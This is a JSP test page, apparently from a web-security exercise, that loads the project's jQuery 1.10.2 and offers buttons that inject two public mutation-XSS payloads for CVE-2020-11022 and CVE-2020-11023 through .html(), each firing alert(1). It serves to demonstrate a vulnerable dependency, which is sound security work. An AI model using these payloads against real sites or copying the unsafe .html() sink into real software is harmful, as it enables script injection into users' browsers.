<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>A03 jQuery CVE PoC</title>

  <!-- Dùng đúng jQuery bạn đang ship (1.10.2) -->
  <script src="${pageContext.request.contextPath}/Eshopper/js/jquery.js"></script>
</head>
<body>
  <h2>A03 - Supply chain: jQuery CVE PoC</h2>

  <p>jQuery version: <b id="ver"></b></p>

  <button id="poc11023">Run PoC (CVE-2020-11023)</button>
  <button id="poc11022">Run PoC (CVE-2020-11022)</button>

  <hr/>
  <div id="out"></div>

  <script>
    document.getElementById("ver").innerText = jQuery.fn.jquery;

    // PoC dạng "self-closing tag + htmlPrefilter" (thường gắn với CVE-2020-11023)
    // Nguồn PoC công khai: mksben.l0.cm
    $("#poc11023").on("click", function () {
      var payload = '<style><style /><img src=x onerror=alert(1)>';
      $("#out").html(payload);
    });

    // PoC khác (thường gắn với CVE-2020-11022)
    $("#poc11022").on("click", function () {
      var payload = '<select><option><style></option></select><img src=x onerror=alert(1)></style>';
      $("#out").html(payload);
    });
  </script>
</body>
</html>
